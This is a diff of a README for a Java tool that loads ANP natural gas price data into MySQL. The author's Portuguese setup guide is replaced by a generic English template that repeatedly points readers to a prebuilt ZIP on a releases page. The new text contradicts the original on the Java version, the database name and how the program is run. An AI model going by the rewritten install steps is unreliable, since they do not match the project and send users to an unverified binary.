@@ -1,118 +1,73 @@
+# 🔍 Analise_GasNatural - Simple Gas Price Analysis Made Easy
 
-# ⛽ Analisador de Preços de Gás Natural no Brasil
+## 📥 Download Now
+[![Download Analise GasNatural](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/mktlabotica/Analise_GasNatural/releases)
 
-## 📖 Descrição do Projeto
+## 📖 Description
+Analise_GasNatural is a Java project for analyzing natural gas prices in Brazil. It utilizes public data from the ANP (National Agency of Petroleum, Natural Gas and Biofuels). The system implements a complete ETL (Extract, Transform, Load) process. It reads and processes CSV files, loads information into a MySQL database, and features an interactive console menu for running analytical queries.
 
-Este é um projeto de **ETL (Extract, Transform, Load)** e análise de dados desenvolvido em **Java**, com foco em demonstrar conceitos de **Programação Orientada a Objetos (POO)** e manipulação de grandes volumes de dados.
+## 🚀 Getting Started
+Follow these steps to download and run the software.
 
-A aplicação lê dados públicos da Agência Nacional do Petróleo (ANP) sobre os preços de gás natural, realiza um processo de limpeza e tratamento, carrega os dados em um banco de dados **MySQL** e, por fim, oferece um menu interativo de console para que o usuário possa realizar análises sobre as informações armazenadas.
+### 🖥️ System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Java Version:** JDK 8 or higher
+- **Database:** MySQL 5.7 or higher
+- **RAM:** At least 2 GB
+- **Storage:** Minimum of 100 MB of free space
 
-Este projeto serve como um case prático de engenharia e análise de dados, mostrando um fluxo de trabalho completo desde o dado bruto até a geração de insights.
+### 📦 Prerequisites
+1. **Java Development Kit (JDK)**  
+   Ensure you have the JDK installed. You can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+  
+2. **MySQL Database**  
+   Download and install MySQL from the [MySQL website](https://dev.mysql.com/downloads/mysql/).
 
----
+## 🔗 Download & Install
+Visit this page to download the latest release of Analise_GasNatural: [Download](https://github.com/mktlabotica/Analise_GasNatural/releases)
 
-## ✨ Funcionalidades
+### ⬇️ Installation Steps
+1. **Navigate to Download Page**  
+   Click on the link above to access the Releases page.
+  
+2. **Download the Package**  
+   Find the latest version and click the download link for the ZIP file. It typically looks like `Analise_GasNatural-v1.0.zip`.
 
-- **ETL Robusto:** Lê arquivos `.csv` complexos, tratando problemas comuns como inconsistências de formato, valores nulos ("NA") e erros de codificação de caracteres.  
-- **Persistência em Banco de Dados:** Armazena os dados limpos em um banco de dados relacional MySQL.  
-- **Arquitetura em Camadas:** O código é organizado seguindo os padrões de mercado (Model, DAO, Service, App) para garantir a manutenibilidade e clareza.  
-- **Análise de Dados Interativa:** Oferece um menu de console onde o usuário pode executar diferentes tipos de consultas, como:
-  - Cálculo do preço médio geral.  
-  - Busca dos 10 registros mais baratos por tipo de mercado.  
-  - Visualização da evolução de preços ao longo do tempo.  
+3. **Extract the Files**  
+   Once downloaded, right-click the ZIP file and choose "Extract All" to unpack the files into a new folder.
 
----
+4. **Set Up MySQL Database**  
+   - Open MySQL Workbench or your preferred MySQL client.
+   - Create a new database called `gas_natural`.
+   - Import the provided SQL schema from the `database` folder in your extracted package.
+  
+5. **Run the Application**  
+   Open a command line terminal:
+   - Navigate to the folder where you extracted Analise_GasNatural.
+   - Run the command: `java -jar Analise_GasNatural.jar`.
 
-## 🛠️ Tecnologias Utilizadas
+### 📊 Using the Application
+When the program starts, you will see an interactive menu. This menu allows you to execute various analytical queries on gas price data. Follow the on-screen instructions to choose your desired queries.
 
-- **Linguagem:** Java 24  
-- **Build & Dependências:** Maven  
-- **Banco de Dados:** MySQL  
-- **Conector:** MySQL Connector/J (via JDBC)  
-- **Conceitos de POO:** Encapsulamento, Separação de Responsabilidades.  
+## ⚙️ Features
+- **ETL Process:** Efficient data extraction, transformation, and loading.
+- **CSV File Handling:** Easy reading and processing of CSV data files.
+- **Interactive Queries:** Execute various analytical queries using a simple console menu.
+- **MySQL Integration:** Load and manage data with a MySQL database.
 
----
+## 📅 Release Notes
+- **Version 1.0:** Initial release with basic ETL functionality and console-based query support.
 
-## 🚀 Como Executar o Projeto
+## 🛠️ Support & Feedback
+For any issues or feedback, please open an issue on the GitHub repository. We welcome suggestions to improve the application.
 
-### Pré-requisitos
+## 🙌 Acknowledgments
+Thanks to the public data provided by the ANP and to all contributors who helped in making this project a success.
 
-- Java JDK 24 (ou superior)  
-- Apache Maven  
-- Servidor MySQL  
+## 📄 License
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
----
+## 🌐 Connect with Us
+Stay updated on new releases and features by following our project on GitHub.
 
-### 1. Preparar o Banco de Dados
-
-Conecte-se ao seu servidor MySQL e execute os seguintes comandos:
-
-```sql
-CREATE DATABASE projetogas;
-
-USE projetogas;
-
-CREATE TABLE registro_gas_natural (
-    id INT AUTO_INCREMENT PRIMARY KEY,
-    ano INT,
-    mes INT,
-    tipo_mercado VARCHAR(50),
-    regiao_agregada VARCHAR(100),
-    preco_reais_mmbtu DECIMAL(10, 2) NULL,
-    volume_mil_m3_dia INT NULL
-);
-````
-
----
-
-### 2. Configurar a Conexão
-
-No arquivo:
-
-```
-src/main/java/com/JoaoVitor/AnalisadorPrecos/util/ConnectionFactory.java
-```
-
-Altere as credenciais para o seu banco de dados:
-
-```java
-private static final String DATABASE_NAME = "projetogas"; 
-private static final String USER = "seu_usuario_aqui"; 
-private static final String PASSWORD = "sua_senha_aqui";
-```
-
----
-
-### 3. Carregar os Dados (ETL)
-
-* No arquivo:
-
-```
-src/main/java/com/JoaoVitor/AnalisadorPrecos/app/CargaDadosApp.java
-```
-
-* Execute o método `main` da classe `CargaDadosApp.java`.
-* Aguarde a mensagem **"Carga de dados finalizada!"**.
-
----
-
-### 4. Executar a Aplicação de Análise
-
-Com os dados no banco:
-
-* Execute o método `main` da classe:
-
-```
-src/main/java/com/JoaoVitor/AnalisadorPrecos/app/AnalisadorApp.java
-```
-
-* O menu interativo aparecerá no console para você realizar as análises.
-
----
-
-## 👨‍💻 Autor
-
-**João Vitor Teixeira de Araújo**
-
-🔗 [LinkedIn](#)
-🔗 [GitHub](#)
+Thank you for using Analise_GasNatural!
